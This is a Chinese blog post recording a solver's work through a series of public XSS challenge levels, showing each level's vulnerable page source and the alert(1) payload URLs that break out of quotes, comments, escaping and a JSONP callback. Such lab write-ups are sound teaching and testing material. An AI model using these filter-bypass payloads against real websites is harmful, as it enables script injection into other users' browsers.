<!DOCTYPE html><html lang="zh"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 一起来玩一些BAT的XSS实例 · p7e4</title><meta name="description" content="一起来玩一些BAT的XSS实例 - p7e4"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://p7e4.js.org/atom.xml" title="p7e4"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/p7e4" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">一起来玩一些BAT的XSS实例</h1><div class="post-info">Jun 26, 2020</div><div class="post-content"><p>今天看先知看到了这个<a href="https://xz.aliyun.com/t/7909" target="_blank" rel="noopener">https://xz.aliyun.com/t/7909</a><br>顺便玩了一下，做下记录  </p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a href="http://px1624.sinaapp.com/test/xsstest1/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest1/</a><br>没给参数，看下源码  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x=location.hash;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x</span>)</span>&#123;&#125;;</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="string">"aa('"</span>+x+<span class="string">"')"</span>,<span class="number">100</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 1~</span><br></pre></td></tr></table></figure>

<p>dom型，闭合前后即可<br><code>http://px1624.sinaapp.com/test/xsstest1/#&#39;);alert(&#39;1</code><br>ps: 要在新标签页打开，因为锚的关系  </p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><a href="http://px1624.sinaapp.com/test/xsstest2/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest2/</a>  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 2~</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'display:none'</span> <span class="attr">id</span>=<span class="string">'xx'</span>&gt;</span><span class="symbol">&amp;lt;</span>img src=x onerror=alert(1)<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'button'</span> <span class="attr">value</span>=<span class="string">'test'</span> <span class="attr">onclick</span>=<span class="string">'alert("å“ˆå“ˆï¼Œç‚¹è¿™çŽ©æ„æ²¡å•¥ç”¨çš„ï¼")'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line">   if(vars)&#123;</span><br><span class="line">        aa(vars[0],vars[1])</span><br><span class="line">   &#125;</span><br><span class="line"><span class="javascript">       <span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x,y</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">"#xx"</span>)[x]($(<span class="string">"#xx"</span>)[y]());</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>jquery操作，先看看有哪些方法可以用<br><img src="https://i.loli.net/2020/06/25/hMVTGg3W4e7krAs.png" alt><br>然后明显注意到了html和text<br><img src="https://i.loli.net/2020/06/25/nifKcM3JYvRWBUP.png" alt><br><code>http://px1624.sinaapp.com/test/xsstest2/?html&amp;text</code>  </p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a>  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">			$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>看完代码一脸懵逼，因为前两题的惯性，还以为是jquery这个版本有问题，最后试了一下才知道px是可控参数（反射性XSS）<br>URL: <code>http://px1624.sinaapp.com/test/xsstest3/?px=payload</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> px = <span class="string">'payload'</span>;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">			$(<span class="string">'xss'</span>).val(<span class="string">'payload'</span>);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那这里的问题在于有两个输出点，按常规思路逃逸出来后就无法闭合第二处的括号，这和我<a href="/2020/02/14/a_xss/">之前</a>发的那个XSS有点像，但又有些差别<br>这里虽然没有后续的注释可以闭合多行注释，但是因为第一处输出点在引号内，我们可以把单行注释隐藏在字符串中，在后面用它来消除<code>/*</code>的影响<br>URL: <code>http://px1624.sinaapp.com/test/xsstest3/?px=1*/alert(1);a={1:1//%27;/*</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> px = <span class="string">'1*/alert(1);a=&#123;1:1//'</span>;<span class="comment">/*';</span></span><br><span class="line"><span class="comment">	if (px != "") &#123;</span></span><br><span class="line"><span class="comment">		$('xss').val('1*/</span>alert(<span class="number">1</span>);a=&#123;<span class="number">1</span>:<span class="number">1</span><span class="comment">//';/*');</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>

<p>后来看了wp,发现大家都是用运算符做的<code>1&#39; * alert(1) * &#39;1</code>  </p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><a href="http://px1624.sinaapp.com/test/xsstest4/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest4/</a><br>前一题的加强版，过滤了运算符和注释，没做出来，看了下wp，有两种解法：</p>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">模板字符串</a><br>URL: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">- `in`和`instanceof`[运算符](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators#%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6)</span><br><span class="line">URL: `http://px1624.sinaapp.com/test/xsstest4/?px=%27%20in%20alert(1)%20in%20%27`</span><br><span class="line"></span><br><span class="line">## 5</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest5/  </span><br><span class="line">进去直接跳转到`http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass~`</span><br><span class="line">没有过滤，输入标签不解析，就知道有问题了，一看`Content-Type`果然  </span><br><span class="line">![](https://i.loli.net/2020/06/25/OmUDzBlkXoTEptx.png)  </span><br><span class="line">这里是不会解析的，再回去看一下请求包  </span><br><span class="line">``` html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script src=&quot;../jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;Script src=&quot;./index.js&quot;&gt;&lt;/Script&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">var orguin = $.Tjs_Get(&apos;uin&apos;);</span><br><span class="line">var pagenum= $.Tjs_Get(&apos;pn&apos;);</span><br><span class="line">if(orguin&lt;=0) window.location=&quot;./user.php?callback=Give me xss bypass~&quot;;</span><br><span class="line">document.write(&apos;&lt;script type=&quot;text/javascript&quot; 	src=&quot;http://px1624.sinaapp.com/&apos;+orguin+&apos;?&apos;+pagenum+&apos;&quot;&gt;&lt;\/script&gt;&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Give me xss bypass 5~</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>翻一下<code>index.js</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// 得到地址栏中的参数值 变量分大小写</span><br><span class="line">Tjs_Get:function(parmtname)&#123;</span><br><span class="line">	//var SERVER_TEMP			= $.Tjs_HtmlEncode(window.location.search.replace(/.*\?/,&quot;&quot;)); //HtmlEncode 进行安全验证</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	var sl = location.href.indexOf(&apos;&amp;&apos;);</span><br><span class="line">	var hl = location.href.indexOf(&apos;#&apos;);</span><br><span class="line">	var str = &apos;&apos;;</span><br><span class="line">	if ((sl &lt; 0 || sl &gt; hl) &amp;&amp; hl &gt; 0) str = location.hash.substr(1);</span><br><span class="line">	else str = location.search.substr(1);</span><br><span class="line">	</span><br><span class="line">	str=str.replace(/%/g,&quot;&quot;);</span><br><span class="line">	//var SERVER_TEMP = str;</span><br><span class="line">	var SERVER_TEMP			= $.Tjs_HtmlEncode(str.replace(/.*\?/,&quot;&quot;)); //HtmlEncode 进行安全验证</span><br><span class="line"></span><br><span class="line">	var PAGE_PARMT_ARRAY	= SERVER_TEMP.split(&quot;&amp;amp;&quot;);</span><br><span class="line">	if(PAGE_PARMT_ARRAY.length==0) return &quot;&quot;;</span><br><span class="line">	var value=&quot;&quot;;</span><br><span class="line">	for(var i=0;i&lt;PAGE_PARMT_ARRAY.length;i++)&#123;</span><br><span class="line">		if(PAGE_PARMT_ARRAY[i]==&quot;&quot;) continue;</span><br><span class="line">		var GETname = PAGE_PARMT_ARRAY[i].substr(0,PAGE_PARMT_ARRAY[i].indexOf(&quot;=&quot;));</span><br><span class="line">		if(GETname == parmtname)&#123;</span><br><span class="line">			value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf(&quot;=&quot;)+1),PAGE_PARMT_ARRAY[i].length);</span><br><span class="line">			return value;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return &quot;&quot;;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">//html正文编码：对需要出现在HTML正文里(除了HTML属性外)的不信任输入进行编码</span><br><span class="line">Tjs_HtmlEncode:function (sStr)</span><br><span class="line">&#123;</span><br><span class="line">	sStr = sStr.replace(/&amp;/g,&quot;&amp;amp;&quot;);</span><br><span class="line">	sStr = sStr.replace(/&gt;/g,&quot;&amp;gt;&quot;);</span><br><span class="line">	sStr = sStr.replace(/&lt;/g,&quot;&amp;lt;&quot;);</span><br><span class="line">	sStr = sStr.replace(/&quot;/g,&quot;&amp;quot;&quot;);</span><br><span class="line">	sStr = sStr.replace(/&apos;/g,&quot;&amp;#39;&quot;);</span><br><span class="line">	return sStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里过滤了双引号且过滤了<code>%</code>无法编码绕过，既然无法逃逸出src属性，那就只能控制加载的js了，刚好利用前面的那个接口<br>URL: <code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code>  </p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p><a href="http://px1624.sinaapp.com/test/xsstest6/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest6/</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback="</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'&lt;script type="text/javascript" 	src="http://px1624.sinaapp.com/pxpath/'</span>+<span class="built_in">decodeURIComponent</span>(orguin)+<span class="string">'&amp;'</span>+<span class="built_in">Math</span>.random()+<span class="string">'"&gt;&lt;\/script&gt;'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Give me xss bypass 6~【任意浏览器弹1就算通过】</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也是前一题的加强版，不同的是输出没有了问号，导致无法正确向<code>user.php</code>传递<code>callback</code>参数，且<code>user.php</code>的<code>callback</code>限制最长七位<br>这里比较明显的多了一行<br><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</code><br>这说明答案可能和编码有关?<br>没解出来<br>做等wp~  </p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><a href="http://px1624.sinaapp.com/test/xsstest7/?px=payload" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest7/?px=payload</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'payload'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~7</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>payload<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="string">'px'</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>两个输出点，JS内的特殊字符前面加<code>\</code>进行转移，另一个转义了尖括号，但是<code>\</code>本身是没有转义的，于是可以用<code>\</code>转义<code>&#39;</code>的反斜线从而进行逃逸<br>但是这样既没有办法闭合也没有办法注释掉后面的单引号<br><img src="https://i.loli.net/2020/06/26/KXRCEZ531SvFTzG.png" alt><br>用模板字符串试一下结果<br><code>SyntaxError: `` literal not terminated before end of script</code><br>看来模板字符串不能跨script，后来用注释试了一下也不行，就跑去看wp了，wp也是用注释做的，不过里面又内嵌了一个<code>&lt;script&gt;</code><br>详见<a href="https://www.dazhuanlan.com/2019/10/25/5db1e6beea817/" target="_blank" rel="noopener">HTML5 + JS Escapers</a><br>URL: <code>http://px1624.sinaapp.com/test/xsstest7/?px=\%27%20*%20`%20*%20alert(1)//%3C!--%20\%3Cscript%20%3E</code></p>
<p>后面两题都是第八题的加强版，都做不出来，太难了我…<br>就解了前三题    </p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/06/27/py_socket_feature/" class="prev">PREV</a><a href="/2020/04/25/2020ygb-acm/" class="next">NEXT</a></div><div class="copyright"><p>Copyright © p7e4 2020.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>